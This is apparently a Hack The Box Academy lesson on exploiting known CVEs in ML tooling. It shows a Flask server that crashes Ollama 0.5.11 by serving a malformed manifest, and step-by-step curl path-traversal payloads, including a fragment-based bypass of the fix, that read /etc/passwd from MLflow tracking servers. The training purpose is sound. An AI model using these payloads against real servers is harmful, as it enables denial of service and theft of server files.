# Vulnerable Framework Code

While we discussed exploiting a vulnerability chain to achieve remote code execution in the previous section, vulnerable framework code can lead to various other security vulnerabilities. These security issues often do not arise from vulnerable code within the ML deployment itself but instead from supply chain vulnerabilities. Using insecure software components in the ML pipeline puts the entire ML application at risk. There are many common security vulnerabilities that popular ML software packages are frequently susceptible to. Let us explore a few recent security vulnerabilities in common ML-related software packages.

---

## CVE-2025-1975: Denial of Service (DoS)

[CVE-2025-1975](https://nvd.nist.gov/vuln/detail/cve-2025-1975)is a DoS vulnerability in[ollama](https://github.com/ollama/ollama), a platform for running and managing LLMs locally. Attackers can target Ollama servers serving an LLM to crash the server and impair its availability. The affected version of ollama`0.5.11`does not correctly check an array size when downloading a model from a remote server, potentially resulting in a crash if the array has an unexpected size.

After downloading the[vulnerable ollama version](https://github.com/ollama/ollama/releases/tag/v0.5.11), we can run the server using the following command:

```
icantthinkofaname23@htb[/htb]`$./ollama serve`
```

To exploit the vulnerability, we need to configure a malicious server that provides an endpoint serving a manipulated model manifest. We can save the following minimal Flask server to a file`server.py`:

Code:python```
`fromflaskimportFlask

app=Flask(__name__)@app.route("/v2/dos/model/manifests/latest")defexploit():return{"layers":[{}]}if__name__=='__main__':app.run(host='127.0.0.1',port=5000)`
```

To run the server, we simply execute`server.py`:

```
icantthinkofaname23@htb[/htb]`$python3 server.py* Serving Flask app 'server'
 * Debug mode: off
WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
 * Running on http://127.0.0.1:5000
Press CTRL+C to quit`
```

To trigger the exploit, we can interact with the ollama server's API, which runs on port`11434`by default. We can use the`/api/pull`endpoint and provide a URL to our malicious server to instruct the server to download the manipulated manifest file, resulting in a crash. We can achieve

Finally, we can enter a Python session and interact with the ollama instance on local port`11434`, specifying the local server to download a model:

```
icantthinkofaname23@htb[/htb]`$curl-X POST -H'Content-Type: application/json'-d'{"model": "http://localhost:5000/dos/model", "insecure": true}'http://localhost:11434/api/pull{"status":"pulling manifest"}
curl: (18) transfer closed with outstanding read data remaining`
```

The curl command returns an error message. In our server logs, we can see a request from ollama:

```
icantthinkofaname23@htb[/htb]`$python3 server.py[...]
127.0.0.1 - - [06/Jul/2025 22:15:04] "GET /v2/dos/model/manifests/latest HTTP/1.1" 200 -`
```

Furthermore, we can see that the ollama server crashed in the server output:

```
icantthinkofaname23@htb[/htb]`$./ollama serve[...]
[GIN] 2025/07/06 - 22:14:52 | 400 |     153.324µs |       127.0.0.1 | POST     "/api/pull"
panic: runtime error: slice bounds out of range [:19] with length 0

goroutine 24 [running]:
github.com/ollama/ollama/server.downloadBlob({0x55dfd2bcbf40, 0xc000613450}, {{{0x55dfd278d265, 0x5}, {0xc000596000, 0xe}, {0xc00059600f, 0x3}, {0xc000596013, 0x5}, ...}, ...})
        github.com/ollama/ollama/server/download.go:478 +0x645
github.com/ollama/ollama/server.PullModel({0x55dfd2bcbf40, 0xc000613450}, {0xc000596000, 0x1f}, 0xc00060f380, 0xc00023a000)
        github.com/ollama/ollama/server/images.go:564 +0x771
github.com/ollama/ollama/server.(*Server).PullHandler.func1()
        github.com/ollama/ollama/server/routes.go:593 +0x197
created by github.com/ollama/ollama/server.(*Server).PullHandler in goroutine 22
        github.com/ollama/ollama/server/routes.go:580 +0x691`
```

---

# CVE-2023-6909 and CVE-2024-1594: Local File Inclusion (LFI)

[MLflow](https://github.com/mlflow/mlflow)is a platform for managing ML projects' entire lifecycle. It provides features for managing and serving ML models, automated evaluation, and logging. It consists of a`Tracking Server`that provides its services in a web-based UI and an API.

**********![MLflow interface showing Experiments tab with Default experiment selected. Options for filtering, sorting, and creating new runs are available.](https://academy.hackthebox.com/storage/modules/315/system/mlflow_1.png)For this section, we need to understand the following MLflow`runs`and`experiments`. An MLflow run is a single execution of a piece of code. An experiment is an organizational concept that groups runs to simplify tracking various information about each run. For instance, an experiment called`Penguin Species Classification`may be used to track all runs of training a classifier for different penguin species.

#### CVE-2023-6909

[CVE-2023-6909](https://nvd.nist.gov/vuln/detail/CVE-2023-6909)is an LFI vulnerability in MLflow`2.7.1`. We can install the vulnerable version on our system using Python's package manager`pip`:

```
icantthinkofaname23@htb[/htb]`$pip3installmlflow==2.7.1`
```

Afterwards, we can run the tracking server using the following command:

```
icantthinkofaname23@htb[/htb]`$mlflow server --host127.0.0.1 --port8080`
```

The LFI vulnerability arises from a flawed conversion of remote URLs to local file paths. The framework does not properly validate URL query parameters, which are appended to local file paths in specific instances, enabling an attacker to craft a malicious URL to break out of the intended local file system directory via a`path traversal`attack. An adversary can exploit this to read arbitrary files from the tracking server's file system.

In a first step, we create a new experiment called`pwn`using the server's API. We provide a path traversal payload in the parameter`artifact_location`. Note that the URL's query string contains the payload, as the payload is preceded by a`?`character. We need to supply sufficient sequences of`../`to reach the file system's root directory :

```
icantthinkofaname23@htb[/htb]`$curl-X POST -H'Content-Type: application/json'-d'{"name": "pwn", "artifact_location": "http:///?/../../../../../../../../../"}''http://127.0.0.1:8080/ajax-api/2.0/mlflow/experiments/create'{
  "experiment_id": "563025420075628626"
}`
```

Afterward, we create a new run in our experiment. We need to supply the`experiment_id`obtained in the previous step and take note of the newly generated`run_id`:

```
icantthinkofaname23@htb[/htb]`$curl-X POST -H'Content-Type: application/json'-d'{"experiment_id": "563025420075628626"}''http://127.0.0.1:8080/api/2.0/mlflow/runs/create'{
  "run": {
    "info": {
      [...]
      "run_id": "bf08b6635cb1427e9893744347fb9604"
    },
    [...]
  }
}`
```

After creating a run, we need to create a new model called`pwn_model`:

```
icantthinkofaname23@htb[/htb]`$curl-X POST -H'Content-Type: application/json'-d'{"name": "pwn_model"}''http://127.0.0.1:8080/ajax-api/2.0/mlflow/registered-models/create'{
  "registered_model": {
    "name": "pwn_model",
    "creation_timestamp": 1751812459599,
    "last_updated_timestamp": 1751812459599
  }
}`
```

In the final step, we need to link our model`pwn_model`to the run we created earlier by creating a new model version, supplying the`run_id`we obtained earlier. Note that we provide a file-URL to the file system's root directory in the`source`parameter:

```
icantthinkofaname23@htb[/htb]`$curl-X POST -H'Content-Type: application/json'-d'{"name": "pwn_model", "run_id": "bf08b6635cb1427e9893744347fb9604", "source": "file:///"}''http://127.0.0.1:8080/ajax-api/2.0/mlflow/model-versions/create'{
  "model_version": {
    "name": "pwn_model",
    "version": "1",
    "creation_timestamp": 1751812696567,
    "last_updated_timestamp": 1751812696567,
    "current_stage": "None",
    "description": "",
    "source": "file:///",
    "run_id": "bf08b6635cb1427e9893744347fb9604",
    "status": "READY",
    "run_link": ""
  }
}`
```

After following these steps, we can now download arbitrary files from the tracking server by specifying our model`pwn_model`and an arbitrary`relative file path`from the root directory in the`path`parameter:

```
icantthinkofaname23@htb[/htb]`$curl'http://127.0.0.1:8080/model-versions/get-artifact?path=etc/passwd&name=pwn_model&version=1'root:x:0:0:root:/root:/bin/bash
[...]`
```

After the vulnerability was reported to the framework's maintainers, it was fixed in[this](https://github.com/mlflow/mlflow/pull/10653/commits/cf0200235c4fe5c7f7c5f86d8e231a76f1a9b2cc1)commit by explicitly checking for the sequence`..`in a URL's query string when creating a new experiment.

#### CVE-2024-1594

The fix for`CVE-2023-6909`proved insufficient, resulting in a similar vulnerability:[CVE-2024-1594](https://nvd.nist.gov/vuln/detail/cve-2024-1594). While the fix mitigated the LFI vulnerability resulting from a path traversal payload in the query string, the payload can also be contained in URL fragments.

To confirm this vulnerability, we need to install MLflow`2.9.2`and start the tracking server:

```
icantthinkofaname23@htb[/htb]`$pip3installmlflow==2.9.2$mlflow server --host127.0.0.1 --port8080`
```

Afterward, let us attempt to create a new experiment`pwn2`using the same payload as before:

```
icantthinkofaname23@htb[/htb]`$curl-X POST -H'Content-Type: application/json'-d'{"name": "pwn2", "artifact_location": "http:///?/../../../../../../../../../"}''http://127.0.0.1:8080/ajax-api/2.0/mlflow/experiments/create'{
	"error_code": "INVALID_PARAMETER_VALUE",
	"message": "Invalid query string"
}`
```

As we can see, the payload is rejected since the query string is explicitly checked for the sequence`..`. Instead, let us provide the path traversal in a URL fragment by prepending the`#`character. Furthermore, we will specify a directory to read files from at the end of the path traversal sequence, in our case,`/etc/`:

```
icantthinkofaname23@htb[/htb]`$curl-X POST -H'Content-Type: application/json'-d'{"name": "pwn2", "artifact_location": "http:///#../../../../../../../../../etc/"}''http://127.0.0.1:8080/ajax-api/2.0/mlflow/experiments/create'{
  "experiment_id": "937441948891987093"
}`
```

From here, the exploitation is the same as for`CVE-2023-6909`, displaying how an improper fix for a security issue can be bypassed.